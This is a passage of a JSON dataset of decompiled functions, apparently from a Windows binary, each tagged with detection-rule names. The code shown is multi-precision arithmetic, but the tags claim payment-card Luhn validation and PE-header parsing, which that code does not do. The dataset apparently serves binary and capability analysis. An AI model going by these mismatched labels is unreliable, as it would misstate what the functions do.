* iVar4;\n    uVar27 = uVar21 + uVar22;\n    iVar5 = arg_ch[6];\n    iVar6 = arg_10h[4];\n    uVar23 = iVar5 * iVar6;\n    uVar28 = uVar27 + uVar23;\n    iVar7 = arg_ch[8];\n    iVar8 = arg_10h[2];\n    uVar24 = iVar7 * iVar8;\n    uVar29 = uVar28 + uVar24;\n    iVar9 = arg_ch[10];\n    iVar10 = *arg_10h;\n    uVar25 = iVar9 * iVar10;\n    uVar30 = uVar29 + uVar25;\n    iVar11 = arg_ch[4];\n    iVar12 = arg_10h[6];\n    uVar26 = iVar11 * iVar12;\n    arg_8h[10] = uVar30 + uVar26;\n    arg_8h[0xb] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20) +\n                  CARRY4(uVar27, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar28, uVar24) + (iVar9 * iVar10 >> 0x20) +\n                  CARRY4(uVar29, uVar25) + (iVar11 * iVar12 >> 0x20) + CARRY4(uVar30, uVar26);\n    iVar1 = arg_ch[6];\n    iVar2 = arg_10h[6];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[10];\n    iVar4 = arg_10h[2];\n    uVar23 = iVar3 * iVar4;\n    uVar29 = uVar22 + uVar23;\n    iVar5 = arg_ch[2];\n    iVar6 = arg_10h[10];\n    uVar24 = iVar5 * iVar6;\n    uVar30 = uVar29 + uVar24;\n    iVar7 = arg_ch[8];\n    iVar8 = arg_10h[4];\n    uVar25 = iVar7 * iVar8;\n    uVar21 = uVar30 * 2;\n    uVar31 = uVar21 + uVar25;\n    iVar9 = *arg_ch;\n    iVar10 = arg_10h[0xc];\n    uVar26 = iVar9 * iVar10;\n    uVar32 = uVar31 + uVar26;\n    iVar11 = arg_ch[0xc];\n    iVar12 = *arg_10h;\n    uVar27 = iVar11 * iVar12;\n    uVar33 = uVar32 + uVar27;\n    iVar13 = arg_ch[4];\n    iVar14 = arg_10h[8];\n    uVar28 = iVar13 * iVar14;\n    arg_8h[0xc] = uVar33 + uVar28;\n    arg_8h[0xd] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23) + (iVar5 * iVar6 >> 0x20)\n                   + CARRY4(uVar29, uVar24)) * 2 | uVar30 >> 0x1f) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar21, uVar25) +\n                  (iVar9 * iVar10 >> 0x20) + CARRY4(uVar31, uVar26) + (iVar11 * iVar12 >> 0x20) + CARRY4(uVar32, uVar27)\n                  + (iVar13 * iVar14 >> 0x20) + CARRY4(uVar33, uVar28);\n    iVar1 = arg_ch[6];\n    iVar2 = arg_10h[8];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[4];\n    iVar4 = arg_10h[10];\n    uVar22 = iVar3 * iVar4;\n    uVar29 = uVar21 + uVar22;\n    iVar5 = arg_ch[10];\n    iVar6 = arg_10h[4];\n    uVar23 = iVar5 * iVar6;\n    uVar30 = uVar29 + uVar23;\n    iVar7 = arg_ch[0xc];\n    iVar8 = arg_10h[2];\n    uVar24 = iVar7 * iVar8;\n    uVar31 = uVar30 + uVar24;\n    iVar9 = arg_ch[8];\n    iVar10 = arg_10h[6];\n    uVar25 = iVar9 * iVar10;\n    uVar32 = uVar31 + uVar25;\n    iVar11 = *arg_ch;\n    iVar12 = arg_10h[0xe];\n    uVar26 = iVar11 * iVar12;\n    uVar33 = uVar32 + uVar26;\n    iVar13 = arg_ch[2];\n    iVar14 = arg_10h[0xc];\n    uVar27 = iVar13 * iVar14;\n    uVar34 = uVar33 + uVar27;\n    iVar15 = arg_ch[0xe];\n    iVar16 = *arg_10h;\n    uVar28 = iVar15 * iVar16;\n    arg_8h[0xe] = uVar34 + uVar28;\n    arg_8h[0xf] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20) +\n                  CARRY4(uVar29, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar30, uVar24) + (iVar9 * iVar10 >> 0x20) +\n                  CARRY4(uVar31, uVar25) + (iVar11 * iVar12 >> 0x20) + CARRY4(uVar32, uVar26) +\n                  (iVar13 * iVar14 >> 0x20) + CARRY4(uVar33, uVar27) + (iVar15 * iVar16 >> 0x20) +\n                  CARRY4(uVar34, uVar28);\n    iVar1 = arg_ch[0xe];\n    iVar2 = arg_10h[2];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[2];\n    iVar4 = arg_10h[0xe];\n    uVar23 = iVar3 * iVar4;\n    uVar31 = uVar22 + uVar23;\n    iVar5 = arg_ch[6];\n    iVar6 = arg_10h[10];\n    uVar24 = iVar5 * iVar6;\n    uVar32 = uVar31 + uVar24;\n    iVar7 = arg_ch[10];\n    iVar8 = arg_10h[6];\n    uVar25 = iVar7 * iVar8;\n    uVar33 = uVar32 + uVar25;\n    iVar9 = arg_ch[4];\n    iVar10 = arg_10h[0xc];\n    uVar26 = iVar9 * iVar10;\n    uVar21 = uVar33 * 2;\n    uVar34 = uVar21 + uVar26;\n    iVar11 = arg_ch[8];\n    iVar12 = arg_10h[8];\n    uVar27 = iVar11 * iVar12;\n    uVar35 = uVar34 + uVar27;\n    iVar13 = *arg_ch;\n    iVar14 = arg_10h[0x10];\n    uVar28 = iVar13 * iVar14;\n    uVar36 = uVar35 + uVar28;\n    iVar15 = arg_ch[0xc];\n    iVar16 = arg_10h[4];\n    uVar29 = iVar15 * iVar16;\n    uVar37 = uVar36 + uVar29;\n    iVar17 = arg_ch[0x10];\n    iVar18 = *arg_10h;\n    uVar30 = iVar17 * iVar18;\n    arg_8h[0x10] = uVar37 + uVar30;\n    arg_8h[0x11] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23) +\n                     (iVar5 * iVar6 >> 0x20) + CARRY4(uVar31, uVar24) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar32, uVar25)\n                    ) * 2 | uVar33 >> 0x1f) + (iVar9 * iVar10 >> 0x20) + CARRY4(uVar21, uVar26) +\n                   (iVar11 * iVar12 >> 0x20) + CARRY4(uVar34, uVar27) + (iVar13 * iVar14 >> 0x20) +\n                   CARRY4(uVar35, uVar28) + (iVar15 * iVar16 >> 0x20) + CARRY4(uVar36, uVar29) +\n                   (iVar17 * iVar18 >> 0x20) + CARRY4(uVar37, uVar30);\n    iVar1 = arg_ch[8];\n    iVar2 = arg_10h[10];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[0x10];\n    iVar4 = arg_10h[2];\n    uVar22 = iVar3 * iVar4;\n    uVar31 = uVar21 + uVar22;\n    iVar5 = *arg_ch;\n    iVar6 = arg_10h[0x12];\n    uVar23 = iVar5 * iVar6;\n    uVar32 = uVar31 + uVar23;\n    iVar7 = arg_ch[0x12];\n    iVar8 = *arg_10h;\n    uVar24 = iVar7 * iVar8;\n    uVar33 = uVar32 + uVar24;\n    iVar9 = arg_ch[2];\n    iVar10 = arg_10h[0x10];\n    uVar25 = iVar9 * iVar10;\n    uVar34 = uVar33 + uVar25;\n    iVar11 = arg_ch[0xc];\n    iVar12 = arg_10h[6];\n    uVar26 = iVar11 * iVar12;\n    uVar35 = uVar34 + uVar26;\n    iVar13 = arg_ch[6];\n    iVar14 = arg_10h[0xc];\n    uVar27 = iVar13 * iVar14;\n    uVar36 = uVar35 + uVar27;\n    iVar15 = arg_ch[0xe];\n    iVar16 = arg_10h[4];\n    uVar28 = iVar15 * iVar16;\n    uVar37 = uVar36 + uVar28;\n    iVar17 = arg_ch[4];\n    iVar18 = arg_10h[0xe];\n    uVar29 = iVar17 * iVar18;\n    uVar38 = uVar37 + uVar29;\n    iVar19 = arg_ch[10];\n    iVar20 = arg_10h[8];\n    uVar30 = iVar19 * iVar20;\n    arg_8h[0x12] = uVar38 + uVar30;\n    arg_8h[0x13] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20)\n                   + CARRY4(uVar31, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar32, uVar24) +\n                   (iVar9 * iVar10 >> 0x20) + CARRY4(uVar33, uVar25) + (iVar11 * iVar12 >> 0x20) +\n                   CARRY4(uVar34, uVar26) + (iVar13 * iVar14 >> 0x20) + CARRY4(uVar35, uVar27) +\n                   (iVar15 * iVar16 >> 0x20) + CARRY4(uVar36, uVar28) + (iVar17 * iVar18 >> 0x20) +\n                   CARRY4(uVar37, uVar29) + (iVar19 * iVar20 >> 0x20) + CARRY4(uVar38, uVar30);\n    iVar1 = arg_ch[6];\n    iVar2 = arg_10h[0xe];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[0xe];\n    iVar4 = arg_10h[6];\n    uVar23 = iVar3 * iVar4;\n    uVar31 = uVar22 + uVar23;\n    iVar5 = arg_ch[0x12];\n    iVar6 = arg_10h[2];\n    uVar24 = iVar5 * iVar6;\n    uVar32 = uVar31 + uVar24;\n    iVar7 = arg_ch[10];\n    iVar8 = arg_10h[10];\n    uVar25 = iVar7 * iVar8;\n    uVar33 = uVar32 + uVar25;\n    iVar9 = arg_ch[2];\n    iVar10 = arg_10h[0x12];\n    uVar26 = iVar9 * iVar10;\n    uVar34 = uVar33 + uVar26;\n    iVar11 = arg_ch[8];\n    iVar12 = arg_10h[0xc];\n    uVar27 = iVar11 * iVar12;\n    uVar21 = uVar34 * 2;\n    uVar35 = uVar21 + uVar27;\n    iVar13 = arg_ch[0xc];\n    iVar14 = arg_10h[8];\n    uVar28 = iVar13 * iVar14;\n    uVar36 = uVar35 + uVar28;\n    iVar15 = arg_ch[0x10];\n    iVar16 = arg_10h[4];\n    uVar29 = iVar15 * iVar16;\n    uVar37 = uVar36 + uVar29;\n    iVar17 = arg_ch[4];\n    iVar18 = arg_10h[0x10];\n    uVar30 = iVar17 * iVar18;\n    arg_8h[0x14] = uVar37 + uVar30;\n    arg_8h[0x15] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23) +\n                     (iVar5 * iVar6 >> 0x20) + CARRY4(uVar31, uVar24) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar32, uVar25)\n                     + (iVar9 * iVar10 >> 0x20) + CARRY4(uVar33, uVar26)) * 2 | uVar34 >> 0x1f) +\n                   (iVar11 * iVar12 >> 0x20) + CARRY4(uVar21, uVar27) + (iVar13 * iVar14 >> 0x20) +\n                   CARRY4(uVar35, uVar28) + (iVar15 * iVar16 >> 0x20) + CARRY4(uVar36, uVar29) +\n                   (iVar17 * iVar18 >> 0x20) + CARRY4(uVar37, uVar30);\n    iVar1 = arg_ch[6];\n    iVar2 = arg_10h[0x10];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[0xe];\n    iVar4 = arg_10h[8];\n    uVar22 = iVar3 * iVar4;\n    uVar29 = uVar21 + uVar22;\n    iVar5 = arg_ch[0x10];\n    iVar6 = arg_10h[6];\n    uVar23 = iVar5 * iVar6;\n    uVar30 = uVar29 + uVar23;\n    iVar7 = arg_ch[4];\n    iVar8 = arg_10h[0x12];\n    uVar24 = iVar7 * iVar8;\n    uVar31 = uVar30 + uVar24;\n    iVar9 = arg_ch[10];\n    iVar10 = arg_10h[0xc];\n    uVar25 = iVar9 * iVar10;\n    uVar32 = uVar31 + uVar25;\n    iVar11 = arg_ch[8];\n    iVar12 = arg_10h[0xe];\n    uVar26 = iVar11 * iVar12;\n    uVar33 = uVar32 + uVar26;\n    iVar13 = arg_ch[0xc];\n    iVar14 = arg_10h[10];\n    uVar27 = iVar13 * iVar14;\n    uVar34 = uVar33 + uVar27;\n    iVar15 = arg_ch[0x12];\n    iVar16 = arg_10h[4];\n    uVar28 = iVar15 * iVar16;\n    arg_8h[0x16] = uVar34 + uVar28;\n    arg_8h[0x17] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20)\n                   + CARRY4(uVar29, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar30, uVar24) +\n                   (iVar9 * iVar10 >> 0x20) + CARRY4(uVar31, uVar25) + (iVar11 * iVar12 >> 0x20) +\n                   CARRY4(uVar32, uVar26) + (iVar13 * iVar14 >> 0x20) + CARRY4(uVar33, uVar27) +\n                   (iVar15 * iVar16 >> 0x20) + CARRY4(uVar34, uVar28);\n    iVar1 = arg_ch[0x12];\n    iVar2 = arg_10h[6];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[0xe];\n    iVar4 = arg_10h[10];\n    uVar23 = iVar3 * iVar4;\n    uVar29 = uVar22 + uVar23;\n    iVar5 = arg_ch[6];\n    iVar6 = arg_10h[0x12];\n    uVar24 = iVar5 * iVar6;\n    uVar30 = uVar29 + uVar24;\n    iVar7 = arg_ch[10];\n    iVar8 = arg_10h[0xe];\n    uVar25 = iVar7 * iVar8;\n    uVar31 = uVar30 + uVar25;\n    iVar9 = arg_ch[0x10];\n    iVar10 = arg_10h[8];\n    uVar26 = iVar9 * iVar10;\n    uVar21 = uVar31 * 2;\n    uVar32 = uVar21 + uVar26;\n    iVar11 = arg_ch[8];\n    iVar12 = arg_10h[0x10];\n    uVar27 = iVar11 * iVar12;\n    uVar33 = uVar32 + uVar27;\n    iVar13 = arg_ch[0xc];\n    iVar14 = arg_10h[0xc];\n    uVar28 = iVar13 * iVar14;\n    arg_8h[0x18] = uVar33 + uVar28;\n    arg_8h[0x19] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23) +\n                     (iVar5 * iVar6 >> 0x20) + CARRY4(uVar29, uVar24) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar30, uVar25)\n                    ) * 2 | uVar31 >> 0x1f) + (iVar9 * iVar10 >> 0x20) + CARRY4(uVar21, uVar26) +\n                   (iVar11 * iVar12 >> 0x20) + CARRY4(uVar32, uVar27) + (iVar13 * iVar14 >> 0x20) +\n                   CARRY4(uVar33, uVar28);\n    iVar1 = arg_ch[8];\n    iVar2 = arg_10h[0x12];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[0xc];\n    iVar4 = arg_10h[0xe];\n    uVar22 = iVar3 * iVar4;\n    uVar27 = uVar21 + uVar22;\n    iVar5 = arg_ch[0x12];\n    iVar6 = arg_10h[8];\n    uVar23 = iVar5 * iVar6;\n    uVar28 = uVar27 + uVar23;\n    iVar7 = arg_ch[0xe];\n    iVar8 = arg_10h[0xc];\n    uVar24 = iVar7 * iVar8;\n    uVar29 = uVar28 + uVar24;\n    iVar9 = arg_ch[0x10];\n    iVar10 = arg_10h[10];\n    uVar25 = iVar9 * iVar10;\n    uVar30 = uVar29 + uVar25;\n    iVar11 = arg_ch[10];\n    iVar12 = arg_10h[0x10];\n    uVar26 = iVar11 * iVar12;\n    arg_8h[0x1a] = uVar30 + uVar26;\n    arg_8h[0x1b] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20)\n                   + CARRY4(uVar27, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar28, uVar24) +\n                   (iVar9 * iVar10 >> 0x20) + CARRY4(uVar29, uVar25) + (iVar11 * iVar12 >> 0x20) +\n                   CARRY4(uVar30, uVar26);\n    iVar1 = arg_ch[0xe];\n    iVar2 = arg_10h[0xe];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[10];\n    iVar4 = arg_10h[0x12];\n    uVar23 = iVar3 * iVar4;\n    uVar27 = uVar22 + uVar23;\n    iVar5 = arg_ch[0x12];\n    iVar6 = arg_10h[10];\n    uVar24 = iVar5 * iVar6;\n    uVar28 = uVar27 + uVar24;\n    iVar7 = arg_ch[0xc];\n    iVar8 = arg_10h[0x10];\n    uVar25 = iVar7 * iVar8;\n    uVar21 = uVar28 * 2;\n    uVar29 = uVar21 + uVar25;\n    iVar9 = arg_ch[0x10];\n    iVar10 = arg_10h[0xc];\n    uVar26 = iVar9 * iVar10;\n    arg_8h[0x1c] = uVar29 + uVar26;\n    arg_8h[0x1d] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23) +\n                     (iVar5 * iVar6 >> 0x20) + CARRY4(uVar27, uVar24)) * 2 | uVar28 >> 0x1f) + (iVar7 * iVar8 >> 0x20) +\n                   CARRY4(uVar21, uVar25) + (iVar9 * iVar10 >> 0x20) + CARRY4(uVar29, uVar26);\n    iVar1 = arg_ch[0xe];\n    iVar2 = arg_10h[0x10];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[0x10];\n    iVar4 = arg_10h[0xe];\n    uVar22 = iVar3 * iVar4;\n    uVar25 = uVar21 + uVar22;\n    iVar5 = arg_ch[0xc];\n    iVar6 = arg_10h[0x12];\n    uVar23 = iVar5 * iVar6;\n    uVar26 = uVar25 + uVar23;\n    iVar7 = arg_ch[0x12];\n    iVar8 = arg_10h[0xc];\n    uVar24 = iVar7 * iVar8;\n    arg_8h[0x1e] = uVar26 + uVar24;\n    arg_8h[0x1f] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22) + (iVar5 * iVar6 >> 0x20)\n                   + CARRY4(uVar25, uVar23) + (iVar7 * iVar8 >> 0x20) + CARRY4(uVar26, uVar24);\n    iVar1 = arg_ch[0x12];\n    iVar2 = arg_10h[0xe];\n    uVar22 = iVar1 * iVar2;\n    iVar3 = arg_ch[0xe];\n    iVar4 = arg_10h[0x12];\n    uVar23 = iVar3 * iVar4;\n    uVar25 = uVar22 + uVar23;\n    iVar5 = arg_ch[0x10];\n    iVar6 = arg_10h[0x10];\n    uVar24 = iVar5 * iVar6;\n    uVar21 = uVar25 * 2;\n    arg_8h[0x20] = uVar21 + uVar24;\n    arg_8h[0x21] = (((iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar22, uVar23)) * 2 | uVar25 >> 0x1f) +\n                   (iVar5 * iVar6 >> 0x20) + CARRY4(uVar21, uVar24);\n    iVar1 = arg_ch[0x12];\n    iVar2 = arg_10h[0x10];\n    uVar21 = iVar1 * iVar2;\n    iVar3 = arg_ch[0x10];\n    iVar4 = arg_10h[0x12];\n    uVar22 = iVar3 * iVar4;\n    arg_8h[0x22] = uVar21 + uVar22;\n    arg_8h[0x23] = (iVar1 * iVar2 >> 0x20) + (iVar3 * iVar4 >> 0x20) + CARRY4(uVar21, uVar22);\n    uVar21 = arg_ch[0x12] * arg_10h[0x12];\n    arg_8h[0x25] = (arg_ch[0x12] * arg_10h[0x12] >> 0x20) << 1 | uVar21 >> 0x1f;\n    arg_8h[0x24] = uVar21 * 2;\n    return;\n}\n",
        "token_count": 7408
    },
    "0040bad1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bad1(uint32_t *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    \n    uVar2 = arg_8h[0x24];\n    uVar3 = arg_8h[0x25];\n    puVar1 = arg_8h + 0x10;\n    uVar4 = *puVar1;\n    *puVar1 = *puVar1 + uVar2 * 0x10;\n    arg_8h[0x11] = arg_8h[0x11] + (uVar3 << 4 | uVar2 >> 0x1c) + CARRY4(uVar4, uVar2 * 0x10);\n    puVar1 = arg_8h + 0x10;\n    uVar4 = *puVar1;\n    *puVar1 = *puVar1 + uVar2 * 2;\n    arg_8h[0x11] = arg_8h[0x11] + (uVar3 << 1 | uVar2 >> 0x1f) + CARRY4(uVar4, uVar2 * 2);\n    puVar1 = arg_8h + 0x10;\n    uVar4 = *puVar1;\n    *puVar1 = *puVar1 + uVar2;\n    uVar5 = arg_8h[0x22];\n    arg_8h[0x11] = arg_8h[0x11] + uVar3 + CARRY4(uVar4, uVar2);\n    uVar2 = arg_8h[0x23];\n    puVar1 = arg_8h + 0xe;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 0x10;\n    arg_8h[0xf] = arg_8h[0xf] + (uVar2 << 4 | uVar5 >> 0x1c) + CARRY4(uVar3, uVar5 * 0x10);\n    puVar1 = arg_8h + 0xe;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 2;\n    arg_8h[0xf] = arg_8h[0xf] + (uVar2 << 1 | uVar5 >> 0x1f) + CARRY4(uVar3, uVar5 * 2);\n    puVar1 = arg_8h + 0xe;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5;\n    uVar4 = arg_8h[0x20];\n    arg_8h[0xf] = arg_8h[0xf] + uVar2 + CARRY4(uVar3, uVar5);\n    uVar2 = arg_8h[0x21];\n    puVar1 = arg_8h + 0xc;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4 * 0x10;\n    arg_8h[0xd] = arg_8h[0xd] + (uVar2 << 4 | uVar4 >> 0x1c) + CARRY4(uVar3, uVar4 * 0x10);\n    puVar1 = arg_8h + 0xc;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4 * 2;\n    arg_8h[0xd] = arg_8h[0xd] + (uVar2 << 1 | uVar4 >> 0x1f) + CARRY4(uVar3, uVar4 * 2);\n    puVar1 = arg_8h + 0xc;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4;\n    uVar5 = arg_8h[0x1e];\n    arg_8h[0xd] = arg_8h[0xd] + uVar2 + CARRY4(uVar3, uVar4);\n    uVar2 = arg_8h[0x1f];\n    puVar1 = arg_8h + 10;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 0x10;\n    arg_8h[0xb] = arg_8h[0xb] + (uVar2 << 4 | uVar5 >> 0x1c) + CARRY4(uVar3, uVar5 * 0x10);\n    puVar1 = arg_8h + 10;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 2;\n    arg_8h[0xb] = arg_8h[0xb] + (uVar2 << 1 | uVar5 >> 0x1f) + CARRY4(uVar3, uVar5 * 2);\n    puVar1 = arg_8h + 10;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5;\n    uVar4 = arg_8h[0x1c];\n    arg_8h[0xb] = arg_8h[0xb] + uVar2 + CARRY4(uVar3, uVar5);\n    uVar2 = arg_8h[0x1d];\n    puVar1 = arg_8h + 8;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4 * 0x10;\n    arg_8h[9] = arg_8h[9] + (uVar2 << 4 | uVar4 >> 0x1c) + CARRY4(uVar3, uVar4 * 0x10);\n    puVar1 = arg_8h + 8;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4 * 2;\n    arg_8h[9] = arg_8h[9] + (uVar2 << 1 | uVar4 >> 0x1f) + CARRY4(uVar3, uVar4 * 2);\n    puVar1 = arg_8h + 8;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4;\n    uVar5 = arg_8h[0x1a];\n    arg_8h[9] = arg_8h[9] + uVar2 + CARRY4(uVar3, uVar4);\n    uVar2 = arg_8h[0x1b];\n    puVar1 = arg_8h + 6;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 0x10;\n    arg_8h[7] = arg_8h[7] + (uVar2 << 4 | uVar5 >> 0x1c) + CARRY4(uVar3, uVar5 * 0x10);\n    puVar1 = arg_8h + 6;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 2;\n    arg_8h[7] = arg_8h[7] + (uVar2 << 1 | uVar5 >> 0x1f) + CARRY4(uVar3, uVar5 * 2);\n    puVar1 = arg_8h + 6;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5;\n    uVar4 = arg_8h[0x18];\n    arg_8h[7] = arg_8h[7] + uVar2 + CARRY4(uVar3, uVar5);\n    uVar2 = arg_8h[0x19];\n    puVar1 = arg_8h + 4;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4 * 0x10;\n    arg_8h[5] = arg_8h[5] + (uVar2 << 4 | uVar4 >> 0x1c) + CARRY4(uVar3, uVar4 * 0x10);\n    puVar1 = arg_8h + 4;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4 * 2;\n    arg_8h[5] = arg_8h[5] + (uVar2 << 1 | uVar4 >> 0x1f) + CARRY4(uVar3, uVar4 * 2);\n    puVar1 = arg_8h + 4;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar4;\n    uVar5 = arg_8h[0x16];\n    arg_8h[5] = arg_8h[5] + uVar2 + CARRY4(uVar3, uVar4);\n    uVar2 = arg_8h[0x17];\n    puVar1 = arg_8h + 2;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 0x10;\n    arg_8h[3] = arg_8h[3] + (uVar2 << 4 | uVar5 >> 0x1c) + CARRY4(uVar3, uVar5 * 0x10);\n    puVar1 = arg_8h + 2;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5 * 2;\n    arg_8h[3] = arg_8h[3] + (uVar2 << 1 | uVar5 >> 0x1f) + CARRY4(uVar3, uVar5 * 2);\n    puVar1 = arg_8h + 2;\n    uVar3 = *puVar1;\n    *puVar1 = *puVar1 + uVar5;\n    uVar4 = arg_8h[0x14];\n    arg_8h[3] = arg_8h[3] + uVar2 + CARRY4(uVar3, uVar5);\n    uVar2 = arg_8h[0x15];\n    uVar3 = *arg_8h;\n    *arg_8h = *arg_8h + uVar4 * 0x10;\n    arg_8h[1] = arg_8h[1] + (uVar2 << 4 | uVar4 >> 0x1c) + CARRY4(uVar3, uVar4 * 0x10);\n    uVar3 = *arg_8h;\n    *arg_8h = *arg_8h + uVar4 * 2;\n    arg_8h[1] = arg_8h[1] + (uVar2 << 1 | uVar4 >> 0x1f) + CARRY4(uVar3, uVar4 * 2);\n    uVar3 = *arg_8h;\n    *arg_8h = *arg_8h + uVar4;\n    arg_8h[1] = arg_8h[1] + uVar2 + CARRY4(uVar3, uVar4);\n    return;\n}\n",
        "token_count": 2641
    },
    "0040bc81": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bc81(uint *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_98h;\n    \n    fcn.0040bcca(&var_98h, arg_ch);\n    fcn.0040bad1(&var_98h);\n    fcn.0040b9bd(&var_98h);\n    puVar2 = &var_98h;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *arg_8h = *puVar2;\n        puVar2 = puVar2 + 1;\n        arg_8h = arg_8h + 1;\n    }\n    return;\n}\n",
        "token_count": 173
    },
    "0040bcca": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040bcca(uint *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int64_t iVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    \n    iVar9 = *arg_ch * *arg_ch;\n    *arg_8h = iVar9;\n    arg_8h[1] = iVar9 >> 0x20;\n    uVar10 = *arg_ch * arg_ch[2];\n    arg_8h[3] = (*arg_ch * arg_ch[2] >> 0x20) << 1 | uVar10 >> 0x1f;\n    arg_8h[2] = uVar10 * 2;\n    uVar10 = *arg_ch * arg_ch[4];\n    iVar9 = arg_ch[2] * arg_ch[2];\n    uVar11 = iVar9;\n    uVar14 = uVar10 + uVar11;\n    arg_8h[5] = ((*arg_ch * arg_ch[4] >> 0x20) + (iVar9 >> 0x20) + CARRY4(uVar10, uVar11)) * 2 | uVar14 >> 0x1f;\n    arg_8h[4] = uVar14 * 2;\n    uVar10 = *arg_ch * arg_ch[6];\n    uVar11 = arg_ch[2] * arg_ch[4];\n    uVar14 = uVar10 + uVar11;\n    arg_8h[7] = ((*arg_ch * arg_ch[6] >> 0x20) + (arg_ch[2] * arg_ch[4] >> 0x20) + CARRY4(uVar10, uVar11)) * 2 |\n                uVar14 >> 0x1f;\n    arg_8h[6] = uVar14 * 2;\n    iVar1 = arg_ch[2];\n    iVar2 = arg_ch[6];\n    uVar14 = iVar1 * iVar2;\n    iVar3 = *arg_ch;\n    iVar4 = arg_ch[8];\n    uVar12 = iVar3 * iVar4;\n    uVar10 = uVar14 * 2;\n    uVar15 = uVar10 + uVar12;\n    iVar9 = arg_ch[4] * 